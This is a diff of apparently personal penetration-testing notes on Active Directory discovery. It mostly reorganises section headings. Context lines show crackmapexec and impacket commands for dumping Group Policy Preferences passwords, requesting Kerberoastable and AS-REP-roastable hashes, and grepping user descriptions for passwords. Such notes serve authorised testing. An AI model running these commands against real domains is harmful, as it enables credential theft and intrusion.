@@ -23,20 +23,21 @@ permalink: /pen/ad/discov
 	* [shoot-dom](#shoot-dom)
 		* [shoot-dcs](#shoot-dcs)
 		* [shoot-desc-users](#shoot-desc-users)
+		* [shoot-pwd-notreqd](#shoot-pwd-notreqd)
 		* [shoot-pwd-policy](#shoot-pwd-policy)
 		* [shoot-delegations](#shoot-delegations)
 		* [shoot-priv-users](#shoot-priv-users)
 		* [shoot-priv-machines](#shoot-priv-machines)
-		* [shoot-gpo](#shoot-gpo)
+		* [shoot-gpp](#shoot-gpp)
 		* [shoot-shares](#shoot-shares)
 		* [shoot-mssql-servers](#shoot-mssql-servers)
 		* [shoot-spns](#shoot-spns)
 		* [shoot-npusers](#shoot-npusers)
-		* [shoot-dacl](#shoot-dacl)
-		* [shoot-gpos](#shoot-gpos)
 * [iter](#iter)
 	* [iter-memberof](#iter-memberof)
 	* [iter-scope](#iter-scope)
+		* [iter-dacl](#iter-dacl)
+		* [iter-gpos](#iter-gpos)
 * [refresh](#refresh)
 	* [check-computer-sessions](#check-computer-sessions)
 	* [last-logons](#last-logons)
@@ -158,6 +159,11 @@ cme ldap -u $ztarg_user_name -p $ztarg_user_pass -kdcHost $zdom_dc_fqdn -d $zdom
 grep -i "pass|pw|=" $zcase"_cme_ldap_get-desc-users.txt"
 ```
 
+#### <a name='shoot-pwd-notreqd'></a>shoot-pwd-notreqd
+```sh
+```
+source: [learn.microsoft](https://learn.microsoft.com/en-us/archive/blogs/russellt/passwd_notreqd)
+
 #### <a name='shoot-pwd-policy'></a>shoot-pwd-policy
 ```sh
 crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol
@@ -233,7 +239,7 @@ DS-Replication-Get-Changes-In-Filtered-Set
 
 ```
 
-#### <a name='shoot-gpo'></a>shoot-gpo
+#### <a name='shoot-gpp'></a>shoot-gpp
 ```bash
 # cme
 crackmapexec smb $zdom_dc_ip -u $ztarg_user_name -p $ztarg_user_pass -M gpp_pasword
@@ -256,15 +262,6 @@ GetUserSPNs.py $zdom_fqdn/$ztarg_user_name:$ztarg_user_pass -dc-ip $zdom_dc_ip -
 ```sh
 # https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
 GetNPUsers.py $zz -dc-ip $zdom_dc_ip -request >> np_users.txt 
-```
-
-#### <a name='shoot-dacl'></a>shoot-dacl
-```sh
-# STEP 1: global gathering
-```
-
-#### <a name='shoot-gpos'></a>shoot-gpos
-```sh
 ```
 
 ## <a name='iter'></a>iter
@@ -320,6 +317,17 @@ while read ztarg_computer_fqdn; python pywerview.py get-netcomputer --computerna
 
 # Get the OS of the owned machines / format the result returned to CSV
 i=0; while read line; do i=$(($i+1)); if [[ $i == 1 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' | tr '\n' ',' >> $zcase"_getnetcomputer_XXX_os.csv ; elif [[ $i == 2 ]]; then echo $line | sed 's/^.*:\s\(.*\)$/\1/' >> $zcase"_getnetcomputer_XXX_os.csv; i=0; fi; done < $zcase"_getcomputer_XXX_os.txt"
+```
+
+### <a name='iter-dacl'></a>iter-dacl
+credit: [thehacker.repices](https://thehacker.repices/ad/movement/dacl)
+![ad privesc DACLs](/assets/images/pen-privesc-dacl.png)
+```sh
+# STEP 1: global gathering
+```
+
+### <a name='iter-gpos'></a>iter-gpos
+```sh
 ```
 
 ## <a name='refresh'></a>refresh
